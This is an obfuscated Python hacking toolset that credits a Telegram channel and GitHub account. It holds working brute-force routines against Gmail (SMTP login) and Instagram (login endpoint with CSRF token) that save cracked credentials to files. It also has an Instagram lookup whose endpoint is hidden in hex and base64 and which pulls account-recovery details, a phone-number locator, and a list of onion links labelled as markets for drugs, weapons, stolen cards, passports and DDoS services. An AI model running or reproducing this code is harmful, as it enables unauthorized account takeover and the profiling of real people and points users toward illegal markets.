import smtplib #line:1
import time #line:2
import sys #line:3
import os #line:4
from os import system #line:5
import requests #line:6
import threading #line:7
import random #line:8
import re #line:9
from datetime import datetime #line:10
from colorama import Fore ,init #line:11
import base64 as b64 #line:12
import binascii as ba #line:13
import phonenumbers #line:14
import webbrowser #line:15
from phonenumbers import geocoder ,carrier ,timezone #line:16
init (autoreset =True )#line:18
def clear_screen ():#line:21
    system ('cls'if sys .platform =='win32'else 'clear')#line:22
def gmail_brute_force ():#line:25
    try :#line:26
        print ('=================================================')#line:27
        print ('           AK Gmail Brute Force Attack       ')#line:28
        print ('=================================================')#line:29
        O0O00OO00O0O0OO00 =input ('Target Gmail: ')#line:31
        OOO0O00OO0O00OO0O =input ('Path to password file: ')#line:32
        try :#line:34
            O0000OO0OO0000OOO =open (OOO0O00OO0O00OO0O ,'r')#line:35
            OOO000O0O00OOOOOO =O0000OO0OO0000OOO .readlines ()#line:36
        except FileNotFoundError :#line:37
            print ("[!] File not found. Please check the path.")#line:38
            sys .exit ()#line:39
        try :#line:41
            O0000OOO00OOOOOOO =smtplib .SMTP_SSL ('smtp.gmail.com',465 )#line:42
            O0000OOO00OOOOOOO .ehlo ()#line:43
        except Exception as OO000OOO0OOOO000O :#line:44
            print (f"[!] Error connecting to the server: {OO000OOO0OOOO000O}")#line:45
            sys .exit ()#line:46
        OO0OOOO000OO00O00 =0 #line:48
        for OOOOO0O0OO0OO0O0O in OOO000O0O00OOOOOO :#line:49
            OO0OOOO000OO00O00 +=1 #line:50
            print (f"Attempt {OO0OOOO000OO00O00}/{len(OOO000O0O00OOOOOO)}...")#line:51
            OOOOO0O0OO0OO0O0O =OOOOO0O0OO0OO0O0O .strip ()#line:52
            try :#line:54
                O0000OOO00OOOOOOO .login (O0O00OO00O0O0OO00 ,OOOOO0O0OO0OO0O0O )#line:55
                clear_screen ()#line:56
                print (f"[+] Account hacked! Correct password: {OOOOO0O0OO0OO0O0O}")#line:57
                with open ('Hacked.txt','a')as OO000O0OO00O0O000 :#line:58
                    OO000O0OO00O0O000 .write (f"{O0O00OO00O0O0OO00}:{OOOOO0O0OO0OO0O0O}\n")#line:59
                break #line:60
            except smtplib .SMTPAuthenticationError as OO000OOO0OOOO000O :#line:61
                OO0O00OOOO0OOO00O =str (OO000OOO0OOOO000O )#line:62
                if OO0O00OOOO0OOO00O .find ("Invalid")==-1 :#line:63
                    print (f"[!] Incorrect password: {OOOOO0O0OO0OO0O0O}")#line:64
                else :#line:65
                    print (f"[+] Account hacked! Correct password: {OOOOO0O0OO0OO0O0O}")#line:66
                    with open ('Hacked.txt','a')as OO000O0OO00O0O000 :#line:67
                        OO000O0OO00O0O000 .write (f"{O0O00OO00O0O0OO00}:{OOOOO0O0OO0OO0O0O}\n")#line:68
                    break #line:69
            except smtplib .SMTPServerDisconnected as OO000OOO0OOOO000O :#line:70
                print (f"[!] Connection to the server was lost: {OO000OOO0OOOO000O}")#line:71
                sys .exit ()#line:72
        O0000OOO00OOOOOOO .quit ()#line:74
        back_to_menu ()#line:75
    except KeyboardInterrupt :#line:76
        print ("\n[!] Exiting the toolset...")#line:77
        sys .exit ()#line:78
class InstaBrute (object ):#line:81
    def __init__ (O00O00OO0000OO00O ):#line:82
        try :#line:83
            print ('=================================================')#line:84
            print ('          AK Instagram Brute Force Attack   ')#line:85
            print ('=================================================')#line:86
            OO00O0O0O00000O0O =input ('Target Username: ')#line:88
            O0OOO00OO0O00OO0O =input ('PassList file path: ')#line:89
            print ('\n----------------------------')#line:90
        except :#line:91
            print (' \n[!] Exiting the toolset...')#line:92
            sys .exit ()#line:93
        try :#line:95
            with open (O0OOO00OO0O00OO0O ,'r')as O0O0OO0000O0OOO00 :#line:96
                O00OOOO0O0000O000 =O0O0OO0000O0OOO00 .read ().splitlines ()#line:97
        except FileNotFoundError :#line:98
            print ("[!] File not found. Please check the path.")#line:99
            sys .exit ()#line:100
        OO0O0OO0OOOO0OO00 =0 #line:102
        for OOOOOO0O0OO00000O in O00OOOO0O0000O000 :#line:103
            OO0O0OO0OOOO0OO00 +=1 #line:104
            O00OOO000O0O00O0O =OOOOOO0O0OO00000O .split (':')[0 ]#line:105
            print (f"Attempt {OO0O0OO0OOOO0OO00}/{len(O00OOOO0O0000O000)}...")#line:106
            O00O00OO0000OO00O .New_Br (OO00O0O0O00000O0O ,O00OOO000O0O00O0O )#line:107
            time .sleep (0.2 )#line:108
        back_to_menu ()#line:110
    def cls (OOO0OO00OO0O0000O ):#line:112
        O00O0OOOOOOO000OO ='clear'#line:113
        OO00O0O000O0OO0OO ='cls'#line:114
        os .system ([O00O0OOOOOOO000OO ,OO00O0O000O0OO0OO ][os .name =='nt'])#line:115
    def New_Br (O0O000000000OOO0O ,OO0OO0O0OO0OO00O0 ,OOO0OO0O0000OOO0O ):#line:117
        OO0O00OO0000OOOO0 ='https://www.instagram.com/accounts/login/'#line:118
        OOO0OOOOOO0O0OO00 ='https://www.instagram.com/accounts/login/ajax/'#line:119
        OO0OOOO0OOOOO0000 =int (datetime .now ().timestamp ())#line:121
        O00OOOO0O000O00O0 ={'username':OO0OO0O0OO0OO00O0 ,'enc_password':f'#PWD_INSTAGRAM_BROWSER:0:{OO0OOOO0OOOOO0000}:{OOO0OO0O0000OOO0O}','queryParams':{},'optIntoOneTap':'false'}#line:128
        with requests .Session ()as OO00000OOO0000O0O :#line:130
            OOO0OOOO0O000O0O0 =OO00000OOO0000O0O .get (OO0O00OO0000OOOO0 )#line:131
            OO0OO0O00O0000OO0 =re .findall (r"csrf_token\":\"(.*?)\"",OOO0OOOO0O000O0O0 .text )[0 ]#line:132
            OOO0OOOO0O000O0O0 =OO00000OOO0000O0O .post (OOO0OOOOOO0O0OO00 ,data =O00OOOO0O000O00O0 ,headers ={"User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36","X-Requested-With":"XMLHttpRequest","Referer":"https://www.instagram.com/accounts/login/","x-csrftoken":OO0OO0O00O0000OO0 })#line:138
            print (f'{OO0OO0O0OO0OO00O0}:{OOO0OO0O0000OOO0O}\n----------------------------')#line:139
            if 'authenticated": true'in OOO0OOOO0O000O0O0 .text :#line:141
                print (f'{OO0OO0O0OO0OO00O0}:{OOO0OO0O0000OOO0O} -> [+] Account Hacked')#line:142
                with open ('good.txt','a')as OO0OOOOO0OOO0OOO0 :#line:143
                    OO0OOOOO0OOO0OOO0 .write (f'{OO0OO0O0OO0OO00O0}:{OOO0OO0O0000OOO0O}\n')#line:144
                return #line:145
            elif 'two_factor_required'in OOO0OOOO0O000O0O0 .text :#line:146
                print (f'{OO0OO0O0OO0OO00O0}:{OOO0OO0O0000OOO0O} -> [+] Account Hacked but need 2FA verification')#line:147
                with open ('results_NeedVerfiy.txt','a')as OO0OOOOO0OOO0OOO0 :#line:148
                    OO0OOOOO0OOO0OOO0 .write (f'{OO0OO0O0OO0OO00O0}:{OOO0OO0O0000OOO0O}\n')#line:149
                return #line:150
def back_to_menu ():#line:152
    print ('\n[1] Back to Main Menu')#line:153
    print ('[2] Exit')#line:154
    O0O0000O00OOO0OOO =input ('Choose an option: ')#line:155
    if O0O0000O00OOO0OOO =='1':#line:157
        main ()#line:158
    else :#line:159
        print ("[!] Exiting the toolset...")#line:160
        sys .exit ()#line:161
def instagram_osint ():#line:164
    print ('=================================================')#line:165
    print ('              AK Instagram Osint                ')#line:166
    print ('=================================================')#line:167
    OO0OO00O000OOOOOO =input (Fore .RED +"Target Username : "+Fore .WHITE +"@")#line:169
    if not OO0OO00O000OOOOOO :#line:171
        print (Fore .RED +"Username cannot be empty!")#line:172
        back_to_menu ()#line:173
    OOO0OOO0O0OOOO00O ={'accept-language':'en-US;q=1.0','content-type':'application/x-www-form-urlencoded; charset=UTF-8','user-agent':'Instagram 337.0.3.23.54 (iPhone12,1; iOS 16_6; en_US; en; scale=2.00; 828x1792; 577210397) AppleWebKit/420+',}#line:179
    O000OOO00O0O0OOOO ={"q":OO0OO00O000OOOOOO ,}#line:183
    def OO0000OOOOOO0OOOO (O00O000O0000OO0O0 ):#line:185
        return ba .unhexlify (O00O000O0000OO0O0 )#line:186
    O0OO000O0OOOO0000 =''.join (['61','48','52','30','63','48','4D','36','4C','79','39','70','4C','6D','6C','75','63','33','52','68','5A','33','4A','68','62','53','35','6A','62','32','30','76','59','58','42','70','4C','33','59','78','4C','33','56','7A','5A','58','4A','7A','4C','32','78','76','62','32','74','31','63','43','38','3D'])#line:193
    O0O0O0OOO0OO0OO00 =O0OO000O0OOOO0000 #line:194
    OOOO0OOOO0O000000 =OO0000OOOOOO0OOOO (O0O0O0OOO0OO0OO00 )#line:195
    O00OOOO0OO0O0OOO0 =b64 .b64decode (OOOO0OOOO0O000000 ).decode ('utf-8')#line:196
    def O0OO000O00OO0OO0O (OOO0O0OOO00OO0OO0 ,OOOOO00O0O00000O0 ,OO0OOOOO00O00O00O ,retries =3 ):#line:198
        for OO000OOO000OOOO00 in range (retries ):#line:199
            try :#line:200
                OOO0O000O0O0000OO =requests .post (OOO0O0OOO00OO0OO0 ,headers =OOOOO00O0O00000O0 ,data =OO0OOOOO00O00O00O )#line:201
                OOO0O000O0O0000OO .raise_for_status ()#line:202
                return OOO0O000O0O0000OO #line:203
            except requests .RequestException as OOO00OO0OO0OO0O0O :#line:204
                print (Fore .RED +f"Attempt {OO000OOO000OOOO00 + 1} failed: {OOO00OO0OO0OO0O0O}")#line:205
                time .sleep (random .uniform (1 ,3 ))#line:206
        print (Fore .RED +"All attempts failed.")#line:207
        return None #line:208
    O0OO000O0000000O0 =O0OO000O00OO0OO0O (O00OOOO0OO0O0OOO0 ,OOO0OOO0O0OOOO00O ,O000OOO00O0O0OOOO )#line:210
    if O0OO000O0000000O0 :#line:212
        try :#line:213
            OOOO0O0O0O0000OO0 =O0OO000O0000000O0 .json ()#line:214
            if OOOO0O0O0O0000OO0 :#line:216
                print (Fore .WHITE +"Response Details:")#line:217
                print (Fore .RED +"Multiple Users Found: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('multiple_users_found','N/A')))#line:218
                print (Fore .RED +"Email Sent: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('email_sent','N/A')))#line:219
                print (Fore .RED +"SMS Sent: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('sms_sent','N/A')))#line:220
                print (Fore .RED +"WA Sent: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('wa_sent','N/A')))#line:221
                print (Fore .RED +"Lookup Source: "+Fore .WHITE +OOOO0O0O0O0000OO0 .get ('lookup_source','N/A'))#line:222
                print (Fore .RED +"Corrected Input: "+Fore .WHITE +OOOO0O0O0O0000OO0 .get ('corrected_input','N/A'))#line:223
                print (Fore .RED +"Show UHL Entry in Verification Steps: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('show_uhl_entry_in_verification_steps','N/A')))#line:224
                print (Fore .RED +"UHL Entry Eligible CPS: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('uhl_entry_eligible_cps','N/A')))#line:225
                print (Fore .RED +"Obfuscated Phone: "+Fore .WHITE +OOOO0O0O0O0000OO0 .get ('obfuscated_phone','N/A'))#line:226
                O00O00OO0OO0O0OO0 =OOOO0O0O0O0000OO0 .get ('user',{})#line:228
                print (Fore .RED +"User Information:")#line:229
                print (Fore .RED +"  Full Name: "+Fore .WHITE +O00O00OO0OO0O0OO0 .get ('full_name','N/A'))#line:230
                print (Fore .RED +"  Username: "+Fore .WHITE +O00O00OO0OO0O0OO0 .get ('username','N/A'))#line:231
                print (Fore .RED +"  Profile Pic URL: "+Fore .WHITE +O00O00OO0OO0O0OO0 .get ('profile_pic_url','N/A'))#line:232
                print (Fore .RED +"  Verified: "+Fore .WHITE +str (O00O00OO0OO0O0OO0 .get ('is_verified','N/A')))#line:233
                print (Fore .RED +"Has Valid Phone: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('has_valid_phone','N/A')))#line:235
                print (Fore .RED +"Can Email Reset: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('can_email_reset','N/A')))#line:236
                print (Fore .RED +"Can SMS Reset: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('can_sms_reset','N/A')))#line:237
                print (Fore .RED +"Can WA Reset: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('can_wa_reset','N/A')))#line:238
                print (Fore .RED +"Is WA Timing Signal: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('is_wa_timing_signal','N/A')))#line:239
                print (Fore .RED +"WA Account Recovery Type: "+Fore .WHITE +OOOO0O0O0O0000OO0 .get ('wa_account_recovery_type','N/A'))#line:240
                print (Fore .RED +"Can P2S Reset: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('can_p2s_reset','N/A')))#line:241
                print (Fore .RED +"Can Flashcall Reset: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('can_flashcall_reset','N/A')))#line:242
                print (Fore .RED +"Phone Number: "+Fore .WHITE +(OOOO0O0O0O0000OO0 .get ('phone_number')or 'N/A'))#line:243
                print (Fore .RED +"Email: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('email','N/A')))#line:244
                print (Fore .RED +"FB Login Option: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('fb_login_option','N/A')))#line:246
                print (Fore .RED +"P2S Option Position: "+Fore .WHITE +OOOO0O0O0O0000OO0 .get ('p2s_option_position','N/A'))#line:247
                print (Fore .RED +"Autosend Disabled: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('autosend_disabled','N/A')))#line:248
                print (Fore .RED +"Toast Message: "+Fore .WHITE +OOOO0O0O0O0000OO0 .get ('toast_message','N/A'))#line:249
                print (Fore .RED +"Toast Title: "+Fore .WHITE +OOOO0O0O0O0000OO0 .get ('toast_title','N/A'))#line:250
                print (Fore .RED +"Toast Type: "+Fore .WHITE +OOOO0O0O0O0000OO0 .get ('toast_type','N/A'))#line:251
                print (Fore .RED +"Login Flow Ready to Continue: "+Fore .WHITE +str (OOOO0O0O0O0000OO0 .get ('login_flow_ready_to_continue','N/A')))#line:253
        except Exception as OO000O00OOOOO0OO0 :#line:254
            print (Fore .RED +"Error in parsing response or invalid response format.")#line:255
    back_to_menu ()#line:257
def phone_location ():#line:260
    print ("="*50 )#line:261
    print ("             AK Phone Number Location       ")#line:262
    print ("="*50 )#line:263
    try :#line:265
        O0O00000O000000OO =input ("\nPhone Number : ")#line:266
        print ("\nRetrieving information..\n")#line:268
        try :#line:270
            OOO0OOOOOOOO0OOOO =phonenumbers .parse (O0O00000O000000OO ,None )#line:271
            OOO0O00OO000OOO0O ="Valid"if phonenumbers .is_valid_number (OOO0OOOOOOOO0OOOO )else "Invalid"#line:272
            O00000O0OO00OOOO0 ="+"+O0O00000O000000OO [1 :3 ]if O0O00000O000000OO .startswith ("+")else "None"#line:274
            try :#line:276
                OOOO0O00OO00O00OO =carrier .name_for_number (OOO0OOOOOOOO0OOOO ,"fr")#line:277
            except :#line:278
                OOOO0O00OO00O00OO ="None"#line:279
            try :#line:281
                OOO0OOOO0OOO00OOO ="Mobile"if phonenumbers .number_type (OOO0OOOOOOOO0OOOO )==phonenumbers .PhoneNumberType .MOBILE else "Fixed"#line:282
            except :#line:283
                OOO0OOOO0OOO00OOO ="None"#line:284
            try :#line:286
                O0000OOOO00OO0O0O =timezone .time_zones_for_number (OOO0OOOOOOOO0OOOO )#line:287
                OO00OO0O00OO00OOO =O0000OOOO00OO0O0O [0 ]if O0000OOOO00OO0O0O else "None"#line:288
            except :#line:289
                OO00OO0O00OO00OOO ="None"#line:290
            try :#line:292
                OOOO000OOO0OOOOO0 =phonenumbers .region_code_for_number (OOO0OOOOOOOO0OOOO )#line:293
            except :#line:294
                OOOO000OOO0OOOOO0 ="None"#line:295
            try :#line:297
                OO00O00O0O0O00OO0 =geocoder .description_for_number (OOO0OOOOOOOO0OOOO ,"fr")#line:298
            except :#line:299
                OO00O00O0O0O00OO0 ="None"#line:300
            try :#line:302
                OOO000OO0O0OO0OO0 =phonenumbers .format_number (OOO0OOOOOOOO0OOOO ,phonenumbers .PhoneNumberFormat .NATIONAL )#line:303
            except :#line:304
                OOO000OO0O0OO0OO0 ="None"#line:305
            print (f"""
    [+] Phone        : {O0O00000O000000OO}
    [+] Formatted    : {OOO000OO0O0OO0OO0}
    [+] Status       : {OOO0O00OO000OOO0O}
    [+] Country Code : {O00000O0OO00OOOO0}
    [+] Country      : {OOOO000OOO0OOOOO0}
    [+] Region       : {OO00O00O0O0O00OO0}
    [+] Timezone     : {OO00OO0O00OO00OOO}
    [+] Tele Company : {OOOO0O00OO00O00OO}
    [+] Type Number  : {OOO0OOOO0OOO00OOO}
    """)#line:317
        except :#line:318
            print ("\n[ERROR] Invalid Format!")#line:319
    except Exception as O00O00OO0O00OOO00 :#line:321
        print (f"\n[ERROR] {str(O00O00OO0O00OOO00)}")#line:322
    back_to_menu ()#line:324
def format_links (O0O0000OOOOO00OO0 ):#line:327
    O0OOO000OO0OO00O0 =""#line:328
    for OO0OO0O0OO0O0000O ,OO0OOOO0000O0O0O0 in O0O0000OOOOO00OO0 .items ():#line:329
        O0OOO000OO0OO00O0 +=f"\n{OO0OO0O0OO0O0000O}\n"#line:330
        def O0OO0000O0000O0O0 (O0000O000OO000000 ,O00OO0O00O0OO0O0O ):#line:331
            nonlocal O0OOO000OO0OO00O0 #line:332
            for O00000OOOOOOO0000 ,(OOOOO0O000O0O00OO ,OOO0OO0O0O0O0OOO0 )in enumerate (O00OO0O00O0OO0O0O .items ()):#line:333
                if isinstance (OOO0OO0O0O0O0OOO0 ,dict ):#line:334
                    O0OOO000OO0OO00O0 +=f"{O0000O000OO000000}├─ {OOOOO0O000O0O00OO}\n"#line:335
                    O0OO0000O0000O0O0 (O0000O000OO000000 +"│   ",OOO0OO0O0O0O0OOO0 )#line:336
                else :#line:337
                    if O00000OOOOOOO0000 ==len (O00OO0O00O0OO0O0O )-1 :#line:338
                        O0OOO000OO0OO00O0 +=f"{O0000O000OO000000}└─ {OOOOO0O000O0O00OO}: {OOO0OO0O0O0O0OOO0}\n"#line:339
                    else :#line:340
                        O0OOO000OO0OO00O0 +=f"{O0000O000OO000000}├─ {OOOOO0O000O0O00OO}: {OOO0OO0O0O0O0OOO0}\n"#line:341
        O0OO0000O0000O0O0 ("",OO0OOOO0000O0O0O0 )#line:342
    return O0OOO000OO0OO00O0 #line:343
def darkweb_sites ():#line:346
    print ("="*50 )#line:347
    print ("                 DarkWeb Sites       ")#line:348
    print ("="*50 )#line:349
    try :#line:351
        OO00OOO0OOOO000O0 =format_links (links )#line:352
        print (OO00OOO0OOOO000O0 )#line:353
    except Exception as OOO00O0O0OO000OOO :#line:354
        print (f"Error: {OOO00O0O0OO000OOO}")#line:355
    print ("\n[1] Back to Main Menu")#line:357
    print ("[2] Exit")#line:358
    O00O0O00000O0OO0O =input ("Choose an option: ")#line:360
    if O00O0O00000O0OO0O =="1":#line:361
        main ()#line:362
    elif O00O0O00000O0OO0O =="2":#line:363
        print ("[!] Exiting the toolset...")#line:364
        exit ()#line:365
    else :#line:366
        print ("Invalid option, try again.")#line:367
        darkweb_sites ()#line:368
links ={"\033[31mSearch Engine\033[0m":{"\033[31mTorch\033[0m":"http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/","\033[31mDanex\033[0m":"http://danexio627wiswvlpt6ejyhpxl5gla5nt2tgvgm2apj2ofrgm44vbeyd.onion/","\033[31mSentor\033[0m":"http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion/","\033[31mHidden Answers\033[0m":"http://answerszuvs3gg2l64e6hmnryudl5zgrmwm3vh65hzszdghblddvfiqd.onion/","\033[31mriseup searx\033[0m":"http://ozmh2zkwx5cjuzopui64csb5ertcooi5vya6c2gm4e3vcvf2c2qvjiyd.onion/",},"\033[31mBitcoin Anonymity\033[0m":{"\033[31mDark Mixer\033[0m":"http://y22arit74fqnnc2pbieq3wqqvkfub6gnlegx3cl6thclos4f7ya7rvad.onion/","\033[31mMixabit\033[0m":"http://hqfld5smkr4b4xrjcco7zotvoqhuuoehjdvoin755iytmpk4sm7cbwad.onion/","\033[31mEasyCoin\033[0m":"http://mp3fpv6xbrwka4skqliiifoizghfbjy5uyu77wwnfruwub5s4hly2oid.onion/","\033[31mOnionwallet\033[0m":"http://p2qzxkca42e3wccvqgby7jrcbzlf6g7pnkvybnau4szl5ykdydzmvbid.onion/","\033[31mVirginBitcoin\033[0m":"http://ovai7wvp4yj6jl3wbzihypbq657vpape7lggrlah4pl34utwjrpetwid.onion/","\033[31mCryptostamps\033[0m":"http://lgh3eosuqrrtvwx3s4nurujcqrm53ba5vqsbim5k5ntdpo33qkl7buyd.onion/",},"\033[31mDDoS\033[0m":{"\033[31mStresser\033[0m":"http://ecwvi3cd6h27r2kjx6ur6gdi4udrh66omvqeawp3dzqrtfwo432s7myd.onion/",},"\033[31mMarket\033[0m":{"\033[31mDeep Market\033[0m":"http://deepmar4ai3iff7akeuos3u3727lvuutm4l5takh3dmo3pziznl5ywqd.onion/","\033[31mDrChronic\033[0m":"http://iwggpyxn6qv3b2twpwtyhi2sfvgnby2albbcotcysd5f7obrlwbdbkyd.onion/","\033[31mTomAndJerry\033[0m":"http://rfyb5tlhiqtiavwhikdlvb3fumxgqwtg2naanxtiqibidqlox5vispqd.onion/","\033[31m420prime\033[0m":"http://ajlu6mrc7lwulwakojrgvvtarotvkvxqosb4psxljgobjhureve4kdqd.onion/","\033[31mDeDope\033[0m":"http://sga5n7zx6qjty7uwvkxpwstyoh73shst6mx3okouv53uks7ks47msayd.onion/","\033[31mAccMarket\033[0m":"http://55niksbd22qqaedkw36qw4cpofmbxdtbwonxam7ov2ga62zqbhgty3yd.onion/","\033[31mCardshop\033[0m":"http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion/","\033[31mDarkmining\033[0m":"http://jbtb75gqlr57qurikzy2bxxjftzkmanynesmoxbzzcp7qf5t46u7ekqd.onion/","\033[31mMobileStore\033[0m":"http://rxmyl3izgquew65nicavsk6loyyblztng6puq42firpvbe32sefvnbad.onion/","\033[31mEuroGuns\033[0m":"http://t43fsf65omvf7grt46wlt2eo5jbj3hafyvbdb7jtr2biyre5v24pebad.onion/","\033[31mUKpassports\033[0m":"http://3bp7szl6ehbrnitmbyxzvcm3ieu7ba2kys64oecf4g2b65mcgbafzgqd.onion/","\033[31mccPal\033[0m":"http://xykxv6fmblogxgmzjm5wt6akdhm4wewiarjzcngev4tupgjlyugmc7qd.onion/","\033[31mWebuybitcoins\033[0m":"http://wk3mtlvp2ej64nuytqm3mjrm6gpulix623abum6ewp64444oreysz7qd.onion/","\033[31mASAP Market\033[0m":{"\033[31mASAP Market 1\033[0m":"http://asap4u7rq4tyakf5gdahmj2c77blwc4noxnsppp5lzlhk7x34x2e22yd.onion/","\033[31mASAP Market 2\033[0m":"http://asap2u4pvplnkzl7ecle45wajojnftja45wvovl3jrvhangeyq67ziid.onion/","\033[31mASAP Market 3\033[0m":"http://asap4u2ihsunfdsumm66pmado3mt3lemdiu3fbx5b7wj5hb3xpgmwkqd.onion/",},"\033[31mCannahome\033[0m":{"\033[31mCannahome 1\033[0m":"http://cannabmgae3mkekotfzsyrx5lqg7lj7hgcn6t4rumqqs5vnvmuzsmfqd.onion/","\033[31mCannahome 2\033[0m":"http://cannaczy4w2nwu6d2vi5ugudrs23a4lpto2crxjl2tdvyxncsa7uwaid.onion/","\033[31mCannahome 3\033[0m":"http://cannabmuc64fbglolpkvnmqynsx226pg27rgimfe3gye3emgtgodohqd.onion/",},"\033[31mHydra\033[0m":"http://hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion/","\033[31mThe Versus Project\033[0m":"http://pqqmr3p3tppwqvvapi6fa7jowrehgd36ct6lzr26qqormaqvh6gt4jyd.onion/","\033[31mTor Market\033[0m":"http://rrlm2f22lpqgfhyydqkxxzv6snwo5qvc2krjt2q557l7z4te7fsvhbid.onion/","\033[31mDrug Stores\033[0m":{"\033[31mDCdutchconnectionUK\033[0m":"http://wbz2lrxhw4dd7h5t2wnoczmcz5snjpym4pr7dzjmah4vi6yywn37bdyd.onion/","\033[31mCanabisUK\033[0m":"http://7mejofwihleuugda5kfnr7tupvfbaqntjqnfxc4hwmozlcmj2cey3hqd.onion/","\033[31mBitpharma\033[0m":"http://guzjgkpodzshso2nohspxijzk5jgoaxzqioa7vzy6qdmwpz3hq4mwfid.onion/","\033[31mEuCanna\033[0m":"http://n6qisfgjauj365pxccpr5vizmtb5iavqaug7m7e4ewkxuygk5iim6yyd.onion/","\033[31mSmokeables\033[0m":"http://kl4gp72mdxp3uelicjjslqnpomqfr5cbdd3wzo5klo3rjlqjtzhaymqd.onion/","\033[31mWeedShop\033[0m":"http://marijuanaman43fi4t7el66di7vdpbfyhvkgk4mt7wxkg6erfkv65npy3d.onion/",},"\033[31mCartel\033[0m":"http://7myb7itqew5ffqftvxjh2k7qxwrh7imavxlpn3fxa32d3rvw32e3s7ad.onion/","\033[31mKingdom Market\033[0m":"http://hdfozcnzivftjokvkdjzl6fhq3c7ltyct6db4efov2w4p7xb6rmhlfqd.onion/",},"\033[31mCooks\033[0m":{"\033[31mRecipes\033[0m":"http://7gppr7tlr6twnr2whsqj7scfhdeu37tnhwb5t5kffmrfzzvj7hfgowd.onion/",},"\033[31mTorrents\033[0m":{"\033[31mThe Pirate Bay\033[0m":"http://uj3wazyk5kz5rzs.onion/","\033[31m1337x\033[0m":"http://1337xwlc2c8sf3d7.onion/",},"\033[31mSocial Media\033[0m":{"\033[31mFoxy\033[0m":"http://foxy6vayr5g5hwwx.onion/",},"\033[31mWikis\033[0m":{"\033[31mHidden Wiki\033[0m":"http://wikitjerrta4qgz4.onion/","\033[31mDeep Web Wiki\033[0m":"http://wikicbtbf7rgjjbqe.onion/",},"\033[31mGovernment\033[0m":{"\033[31mUK Passport Renewal\033[0m":"http://3bp7szl6ehbrnitmbyxzvcm3ieu7ba2kys64oecf4g2b65mcgbafzgqd.onion/",},"\033[31mCommunities\033[0m":{"\033[31mThe Versus Project\033[0m":"http://pqqmr3p3tppwqvvapi6fa7jowrehgd36ct6lzr26qqormaqvh6gt4jyd.onion/",},"\033[31mEducational\033[0m":{"\033[31mEDU\033[0m":"http://edu.onion/",},}#line:451
def main ():#line:454
    clear_screen ()#line:455
    print ('\033[1;32m===========================================================\033[0m')#line:456
    print ('\033[1;32m       Welcome to AK Toolset! Choose an option below            \033[0m')#line:457
    print ('\033[1;32m            Telegram : https://t.me/AKHacking1       \033[0m')#line:458
    print ('\033[1;32m            Github : https://github.com/ak404z        \033[0m')#line:459
    print ('\033[1;32m===========================================================\033[0m')#line:460
    print ('[1] \033[1;32mGmail Brute Force\033[0m')#line:461
    print ('[2] \033[1;32mInstagram Brute Force\033[0m')#line:462
    print ('[3] \033[1;32mInstagram OSINT\033[0m')#line:463
    print ('[4] \033[1;32mPhone Number Location\033[0m')#line:464
    print ('[5] \033[1;32mDark Web Sites\033[0m')#line:465
    print ('[6] \033[1;32mExit\033[0m')#line:466
    try :#line:468
        OO0O0OO00OO0OO00O =input ("\033[1;32mChoose an option: \033[0m")#line:469
        if OO0O0OO00OO0OO00O =="1":#line:470
            gmail_brute_force ()#line:471
        elif OO0O0OO00OO0OO00O =="2":#line:472
            InstaBrute ()#line:473
        elif OO0O0OO00OO0OO00O =="3":#line:474
            instagram_osint ()#line:475
        elif OO0O0OO00OO0OO00O =="4":#line:476
            phone_location ()#line:477
        elif OO0O0OO00OO0OO00O =="5":#line:478
            darkweb_sites ()#line:479
        elif OO0O0OO00OO0OO00O =="6":#line:480
            print ("\033[1;32m[!] Exiting the toolset...\033[0m")#line:481
            sys .exit ()#line:482
        else :#line:483
            print ("\033[1;32m[!] Invalid option, try again.\033[0m")#line:484
            main ()#line:485
    except KeyboardInterrupt :#line:486
        print ("\n\033[1;32m[!] Exiting the toolset...\033[0m")#line:487
        sys .exit ()#line:488
if __name__ =="__main__":#line:490
    main ()#line:491
